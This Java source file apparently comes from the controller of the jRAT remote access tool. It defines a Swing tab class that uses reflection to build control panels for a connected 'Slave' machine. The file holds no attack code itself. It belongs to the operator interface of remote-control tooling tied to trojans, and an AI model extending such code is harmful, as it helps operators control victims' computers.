package jrat.api.ui;

import jrat.controller.Slave;
import jrat.controller.ui.panels.PanelControlParent;

import javax.swing.*;
import java.lang.reflect.Constructor;

/**
 * Control panel tab view
 */
public class ControlPanelTab extends ControlPanelItem<Class<? extends PanelControlParent>> {

    public ControlPanelTab(ControlPanel.Category category, String text, ImageIcon icon, Class<? extends PanelControlParent> panel) {
        super(category, text, icon, panel);
    }

    public PanelControlParent createPanel(Slave slave) {
        try {
            Constructor ctor = item.getDeclaredConstructor(Slave.class);
            PanelControlParent instance = (PanelControlParent) ctor.newInstance(slave);

            return instance;
        } catch (Exception ex) {
            ex.printStackTrace();
            return null;
        }
    }
}
